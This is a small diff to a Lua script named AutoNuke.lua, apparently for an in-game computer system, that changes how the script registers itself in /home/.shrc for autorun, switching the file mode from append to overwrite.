@@ -65,7 +65,7 @@ end
 
 print("REGISTERING INTO .shrc FOR AUTORUN")
 
-local auto = io.open("/home/.shrc", "a")
+local auto = io.open("/home/.shrc", "w")
 if auto then
 auto:write("/home/AutoNuke.lua")
 auto:close()
